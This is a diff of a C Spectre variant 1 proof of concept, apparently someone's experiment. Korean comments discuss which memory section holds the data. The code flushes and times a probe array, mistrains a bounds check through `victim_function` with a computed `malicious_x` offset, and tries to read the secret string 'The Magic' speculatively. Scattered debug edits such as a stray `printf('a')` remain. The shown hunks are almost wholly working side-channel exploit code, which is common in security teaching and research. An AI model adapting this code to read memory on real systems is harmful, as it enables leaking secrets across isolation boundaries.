@@ -2,21 +2,21 @@
 #include <string.h>
 #include <stdint.h>
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-#include "local_content.h"
+//#include "local_content.h"
 
 static volatile int public_data_size;
 
-/*
-uint8_t public_data[16] = {
+
+uint8_t public_data[16] = { // -> .data 영역
   1,  2,  3,  4,
   5,  6,  7,  8,
   9, 10, 11, 12,
   13, 14, 15, 16
 };
-*/
+
 
 //const char *public_data = "1234567890123456"; // ->  .rodata 영역
-//const char *private_data = "The Magic";
+const char *private_data = "The Magic";
 uint8_t probe[256 * 512];
 
 
@@ -64,7 +64,6 @@ void readMemoryByte(const char* data,int cache_hit_threshold, size_t malicious_x
       x = (x | (x >> 16));         
       x = training_x ^ (x & (malicious_x ^ training_x));
 
-      
       victim_function(x);
     }
 
@@ -92,7 +91,7 @@ void readMemoryByte(const char* data,int cache_hit_threshold, size_t malicious_x
     }
   }
 
-  printf("char  = %d,and  %c a\n", results[answer], answer);
+  //printf("char  = %d,and  %c a\n", results[answer], answer);
 }
 
 int main(void) {
@@ -100,15 +99,26 @@ int main(void) {
   size_t malicious_x = (size_t)(private_data- (char *)public_data);
   int cache_hit_threshold = 80;
   int i;
-  printf("%p %p \n",private_data, public_data);
-  printf("%p\n", public_data + malicious_x);
+  
+
   for (i = 0; i < (int)sizeof(probe); i++) {
     probe[i] = 1; /* write to probe so in RAM not copy-on-write zero pages */
   }
+  int p = 10;
 
-  //printf("aa");
-  volatile uint8_t sink;                       // 사이드이펙트 보관
-  sink ^= *(volatile uint8_t *)public_data; 
+  //printf("a");
+
+  printf("a"); 
+
+  //printf(&p);
+
+  // =.rodata section
+  
+  
+  //volatile uint8_t temp;                       
+  //temp ^= *(volatile uint8_t *)private_data;   //private data는 캐싱이 되어있어야 함.(speculation window안에서 접근하도록)
+  
   readMemoryByte(public_data,cache_hit_threshold, malicious_x++);
+
   return 0;
 }
